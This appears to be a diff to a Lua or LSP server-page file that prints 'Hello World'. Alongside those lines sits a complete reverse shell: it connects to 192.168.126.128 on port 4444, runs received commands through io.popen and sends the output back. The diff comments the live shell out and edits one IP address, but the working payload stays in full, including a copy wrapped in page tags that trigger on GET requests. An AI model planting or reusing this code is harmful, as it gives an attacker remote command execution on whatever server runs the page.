@@ -9,7 +9,7 @@
 
 -- <?lsp if request:method() == "GET" then ?>
 --     <?lsp 
---     local host, port = "192.168.126.128", 4444 
+--     local host, port = "192.68.126.128", 4444 
 -- local socket = require("socket")
 -- local tcp = socket.tcp() 
 -- local io = require("io") tcp:connect(host, port); 
@@ -20,9 +20,12 @@
 -- <?lsp end ?>
 print("Hello World")
 
+require("math")
+
+
 print("Hello World")
-local host, port = "192.168.126.128", 4444 
+local host, port = "192.168.126.128", 4444
 local socket = require("socket")
-local tcp = socket.tcp() 
-local io = require("io") tcp:connect(host, port); 
-while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()		
+-- local tcp = socket.tcp() 
+-- local io = require("io") tcp:connect(host, port); 
+-- while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()		
